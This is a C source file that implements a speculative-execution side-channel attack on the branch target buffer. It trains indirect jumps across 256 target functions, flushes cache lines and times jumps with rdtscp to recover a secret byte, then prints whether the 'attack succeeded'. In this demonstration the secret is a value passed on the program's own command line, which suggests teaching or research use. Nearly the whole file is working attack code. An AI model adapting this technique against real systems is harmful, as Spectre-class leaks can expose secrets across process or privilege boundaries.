#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

/*
 * Implements a side-channel timing attack via the BTB.
 * We jump to NUM_POSSIBLE_ANSWERS different targets from the same line of code, and the target
 * that we jump to depends on a secret byte. Because squashing after an incorrect
 * BTB entry takes time, we can infer the value.
 */

#define clflush __builtin_ia32_clflush
#define STALL_ITERS 100
#define NUM_POSSIBLE_ANSWERS 256
#define DEFAULT_SECRET_VALUE 42

#define RED  "\x1B[31m"
#define GRN  "\x1B[32m"
#define YLW  "\x1B[33m"
#define DEFAULT  "\x1B[0m"

/*
 * rdtscp (our high-accuracy timer)
 */
static inline __attribute__((always_inline))  uint64_t rdtscp(void)
{
    unsigned int low, high;

    asm volatile("rdtscp" : "=a" (low), "=d" (high) :: "rcx" );

    return low | ((uint64_t)high) << 32; 
}

void target0(void){return;}
void target1(void){return;}
void target2(void){return;}
void target3(void){return;}
void target4(void){return;}
void target5(void){return;}
void target6(void){return;}
void target7(void){return;}
void target8(void){return;}
void target9(void){return;}
void target10(void){return;}
void target11(void){return;}
void target12(void){return;}
void target13(void){return;}
void target14(void){return;}
void target15(void){return;}
void target16(void){return;}
void target17(void){return;}
void target18(void){return;}
void target19(void){return;}
void target20(void){return;}
void target21(void){return;}
void target22(void){return;}
void target23(void){return;}
void target24(void){return;}
void target25(void){return;}
void target26(void){return;}
void target27(void){return;}
void target28(void){return;}
void target29(void){return;}
void target30(void){return;}
void target31(void){return;}
void target32(void){return;}
void target33(void){return;}
void target34(void){return;}
void target35(void){return;}
void target36(void){return;}
void target37(void){return;}
void target38(void){return;}
void target39(void){return;}
void target40(void){return;}
void target41(void){return;}
void target42(void){return;}
void target43(void){return;}
void target44(void){return;}
void target45(void){return;}
void target46(void){return;}
void target47(void){return;}
void target48(void){return;}
void target49(void){return;}
void target50(void){return;}
void target51(void){return;}
void target52(void){return;}
void target53(void){return;}
void target54(void){return;}
void target55(void){return;}
void target56(void){return;}
void target57(void){return;}
void target58(void){return;}
void target59(void){return;}
void target60(void){return;}
void target61(void){return;}
void target62(void){return;}
void target63(void){return;}
void target64(void){return;}
void target65(void){return;}
void target66(void){return;}
void target67(void){return;}
void target68(void){return;}
void target69(void){return;}
void target70(void){return;}
void target71(void){return;}
void target72(void){return;}
void target73(void){return;}
void target74(void){return;}
void target75(void){return;}
void target76(void){return;}
void target77(void){return;}
void target78(void){return;}
void target79(void){return;}
void target80(void){return;}
void target81(void){return;}
void target82(void){return;}
void target83(void){return;}
void target84(void){return;}
void target85(void){return;}
void target86(void){return;}
void target87(void){return;}
void target88(void){return;}
void target89(void){return;}
void target90(void){return;}
void target91(void){return;}
void target92(void){return;}
void target93(void){return;}
void target94(void){return;}
void target95(void){return;}
void target96(void){return;}
void target97(void){return;}
void target98(void){return;}
void target99(void){return;}
void target100(void){return;}
void target101(void){return;}
void target102(void){return;}
void target103(void){return;}
void target104(void){return;}
void target105(void){return;}
void target106(void){return;}
void target107(void){return;}
void target108(void){return;}
void target109(void){return;}
void target110(void){return;}
void target111(void){return;}
void target112(void){return;}
void target113(void){return;}
void target114(void){return;}
void target115(void){return;}
void target116(void){return;}
void target117(void){return;}
void target118(void){return;}
void target119(void){return;}
void target120(void){return;}
void target121(void){return;}
void target122(void){return;}
void target123(void){return;}
void target124(void){return;}
void target125(void){return;}
void target126(void){return;}
void target127(void){return;}
void target128(void){return;}
void target129(void){return;}
void target130(void){return;}
void target131(void){return;}
void target132(void){return;}
void target133(void){return;}
void target134(void){return;}
void target135(void){return;}
void target136(void){return;}
void target137(void){return;}
void target138(void){return;}
void target139(void){return;}
void target140(void){return;}
void target141(void){return;}
void target142(void){return;}
void target143(void){return;}
void target144(void){return;}
void target145(void){return;}
void target146(void){return;}
void target147(void){return;}
void target148(void){return;}
void target149(void){return;}
void target150(void){return;}
void target151(void){return;}
void target152(void){return;}
void target153(void){return;}
void target154(void){return;}
void target155(void){return;}
void target156(void){return;}
void target157(void){return;}
void target158(void){return;}
void target159(void){return;}
void target160(void){return;}
void target161(void){return;}
void target162(void){return;}
void target163(void){return;}
void target164(void){return;}
void target165(void){return;}
void target166(void){return;}
void target167(void){return;}
void target168(void){return;}
void target169(void){return;}
void target170(void){return;}
void target171(void){return;}
void target172(void){return;}
void target173(void){return;}
void target174(void){return;}
void target175(void){return;}
void target176(void){return;}
void target177(void){return;}
void target178(void){return;}
void target179(void){return;}
void target180(void){return;}
void target181(void){return;}
void target182(void){return;}
void target183(void){return;}
void target184(void){return;}
void target185(void){return;}
void target186(void){return;}
void target187(void){return;}
void target188(void){return;}
void target189(void){return;}
void target190(void){return;}
void target191(void){return;}
void target192(void){return;}
void target193(void){return;}
void target194(void){return;}
void target195(void){return;}
void target196(void){return;}
void target197(void){return;}
void target198(void){return;}
void target199(void){return;}
void target200(void){return;}
void target201(void){return;}
void target202(void){return;}
void target203(void){return;}
void target204(void){return;}
void target205(void){return;}
void target206(void){return;}
void target207(void){return;}
void target208(void){return;}
void target209(void){return;}
void target210(void){return;}
void target211(void){return;}
void target212(void){return;}
void target213(void){return;}
void target214(void){return;}
void target215(void){return;}
void target216(void){return;}
void target217(void){return;}
void target218(void){return;}
void target219(void){return;}
void target220(void){return;}
void target221(void){return;}
void target222(void){return;}
void target223(void){return;}
void target224(void){return;}
void target225(void){return;}
void target226(void){return;}
void target227(void){return;}
void target228(void){return;}
void target229(void){return;}
void target230(void){return;}
void target231(void){return;}
void target232(void){return;}
void target233(void){return;}
void target234(void){return;}
void target235(void){return;}
void target236(void){return;}
void target237(void){return;}
void target238(void){return;}
void target239(void){return;}
void target240(void){return;}
void target241(void){return;}
void target242(void){return;}
void target243(void){return;}
void target244(void){return;}
void target245(void){return;}
void target246(void){return;}
void target247(void){return;}
void target248(void){return;}
void target249(void){return;}
void target250(void){return;}
void target251(void){return;}
void target252(void){return;}
void target253(void){return;}
void target254(void){return;}
void target255(void){return;}

static void (*targets[NUM_POSSIBLE_ANSWERS])(void) = {
    target0,
    target1,
    target2,
    target3,
    target4,
    target5,
    target6,
    target7,
    target8,
    target9,
    target10,
    target11,
    target12,
    target13,
    target14,
    target15,
    target16,
    target17,
    target18,
    target19,
    target20,
    target21,
    target22,
    target23,
    target24,
    target25,
    target26,
    target27,
    target28,
    target29,
    target30,
    target31,
    target32,
    target33,
    target34,
    target35,
    target36,
    target37,
    target38,
    target39,
    target40,
    target41,
    target42,
    target43,
    target44,
    target45,
    target46,
    target47,
    target48,
    target49,
    target50,
    target51,
    target52,
    target53,
    target54,
    target55,
    target56,
    target57,
    target58,
    target59,
    target60,
    target61,
    target62,
    target63,
    target64,
    target65,
    target66,
    target67,
    target68,
    target69,
    target70,
    target71,
    target72,
    target73,
    target74,
    target75,
    target76,
    target77,
    target78,
    target79,
    target80,
    target81,
    target82,
    target83,
    target84,
    target85,
    target86,
    target87,
    target88,
    target89,
    target90,
    target91,
    target92,
    target93,
    target94,
    target95,
    target96,
    target97,
    target98,
    target99,
    target100,
    target101,
    target102,
    target103,
    target104,
    target105,
    target106,
    target107,
    target108,
    target109,
    target110,
    target111,
    target112,
    target113,
    target114,
    target115,
    target116,
    target117,
    target118,
    target119,
    target120,
    target121,
    target122,
    target123,
    target124,
    target125,
    target126,
    target127,
    target128,
    target129,
    target130,
    target131,
    target132,
    target133,
    target134,
    target135,
    target136,
    target137,
    target138,
    target139,
    target140,
    target141,
    target142,
    target143,
    target144,
    target145,
    target146,
    target147,
    target148,
    target149,
    target150,
    target151,
    target152,
    target153,
    target154,
    target155,
    target156,
    target157,
    target158,
    target159,
    target160,
    target161,
    target162,
    target163,
    target164,
    target165,
    target166,
    target167,
    target168,
    target169,
    target170,
    target171,
    target172,
    target173,
    target174,
    target175,
    target176,
    target177,
    target178,
    target179,
    target180,
    target181,
    target182,
    target183,
    target184,
    target185,
    target186,
    target187,
    target188,
    target189,
    target190,
    target191,
    target192,
    target193,
    target194,
    target195,
    target196,
    target197,
    target198,
    target199,
    target200,
    target201,
    target202,
    target203,
    target204,
    target205,
    target206,
    target207,
    target208,
    target209,
    target210,
    target211,
    target212,
    target213,
    target214,
    target215,
    target216,
    target217,
    target218,
    target219,
    target220,
    target221,
    target222,
    target223,
    target224,
    target225,
    target226,
    target227,
    target228,
    target229,
    target230,
    target231,
    target232,
    target233,
    target234,
    target235,
    target236,
    target237,
    target238,
    target239,
    target240,
    target241,
    target242,
    target243,
    target244,
    target245,
    target246,
    target247,
    target248,
    target249,
    target250,
    target251,
    target252,
    target253,
    target254,
    target255,
};
/*
 * Indirect jump to a function.
 * We use this as a helper function, to ensure that our targets are called
 * from the same line of code and will thus always replace the same BTB entry.
 * @param idx : the index of targets we wish to jump to.
 */
void jump_to_target(int idx)
{
    void (*target)(void) = targets[idx];
    target();
}

/*
 * Selects the address we jump to
 * @param x : where we store the address
 * @param addr1 : our usual target
 * @param addr2 : our speculative target
 * @param selector : the counter that determines the target
 */
#define SELECT_TARGET_VADDR(x, addr1, addr2, selector) \
    /* x == 0x0 if selector is 0, otherwise x == 0xFFFFFFFFFFFFFFFF*/ \
    x = (selector == 0) * ~0x0;  \
    /* if selctor != 0 --> return addr1. if selector == 0 --> return addr 2*/ \
    x = addr1 ^ (x & (addr2 ^ addr1));

/* Used to ensure our target is in the cache */
volatile int temp = 0;

// last entry in targets array is reserved for our junk func
int junk_target_index = 0;

/* the address of junk_target_index */
volatile uint64_t benign_vaddr = (uint64_t) &junk_target_index;

/* ptr to our benign address (to cause a delay) */
volatile uint64_t *benign_vaddr_ptr = &benign_vaddr;

/* ptr to our benign address ptr (to cause a bigger delay) */
volatile uint64_t **benign_vaddr_ptr_ptr = &benign_vaddr_ptr;

/*
 * Suppresses fault, so that we only SPECULATIVELY jump to victim_addr
 * @param victim_vaddr : the secret address we want to read
 */
void train_then_speculatively_jump(uint64_t victim_vaddr, int guess)
{
    uint64_t selected_target_vaddr;
    
    for (int j = 13; j >= 0 ; j--) {
        SELECT_TARGET_VADDR(
            selected_target_vaddr, benign_vaddr, victim_vaddr, j);

        // make sure guess is in the cache and junk value is our latest
        // non-speculative BTB entry        

        temp = *((int *) selected_target_vaddr);
        clflush( (void*) &benign_vaddr);
        clflush( (void*) &benign_vaddr_ptr);
        clflush( (void*) &benign_vaddr_ptr_ptr);
        
        jump_to_target(guess);
        jump_to_target(junk_target_index);

        for (volatile int z = 0; z < STALL_ITERS; z++) {};

        if (selected_target_vaddr == **benign_vaddr_ptr_ptr) {
            jump_to_target(*((int *) selected_target_vaddr));
        } 
    }
}

/*
 * Error func for improper use of script
 * Does not return to caller
 */
void die_usage(void)
{
    fprintf(stderr, "Usage: ./btb_attack [secret_value]\n");
    fprintf(stderr, "\twhere secret_value is an int from [0,%u)\n",
        NUM_POSSIBLE_ANSWERS);
    exit(1);
}

int main(int argc, char **argv)
{
    if (argc > 2) {
        die_usage();
    }
    /* Extract secret_value from command line */
    int secret_value = DEFAULT_SECRET_VALUE;
    if (argc == 2) {
        secret_value = atoi(argv[1]);
    }

    if (secret_value < 0 || secret_value >= NUM_POSSIBLE_ANSWERS) {
        die_usage();
    }

    /* Recorded times for each of NUM_POSSIBLE_ANSWERS secret_value guesses each trial */
    uint64_t times[NUM_POSSIBLE_ANSWERS];

    /* Timers */
    register uint64_t start_time;

    fprintf(stderr, "%sGuess Value,Cycles\n%s", YLW, DEFAULT);

    /* loop through all NUM_POSSIBLE_ANSWERS possible values */
    /* Running it twice and only keeping second iter makes sure everything is
     in cache */
    for (int i = 0; i < 2; i++) {
        for (register int guess = 0; guess < NUM_POSSIBLE_ANSWERS; guess++) {

            train_then_speculatively_jump((uint64_t) &secret_value, guess);

            /* stall pipe to make speculation has occurred */
            for (volatile int x = 0; x < STALL_ITERS; x++) {};

            /* record time for this value */
            start_time = rdtscp();
            jump_to_target(guess);
            times[guess] = rdtscp() - start_time;
        };
    }

    // determine what guess is most likely based on times for this trial
    uint64_t min_time = UINT64_MAX;
    int guess = 0;
    for (int i = 0; i < NUM_POSSIBLE_ANSWERS; i++) {
        fprintf(stderr, "%s%i,%lu\n%s", YLW, i, times[i], DEFAULT);
        if (times[i] < min_time) {
            min_time = times[i];
            guess = i;
        }
    }

    if (secret_value == guess) {
        fprintf(stderr, "Attack succeeded. Secret correctly guessed as %d\n", secret_value);
    } else {
        fprintf(stderr, "Attack failed. Could not determine the secret (%d)\n", secret_value);
    }
    return 0;
}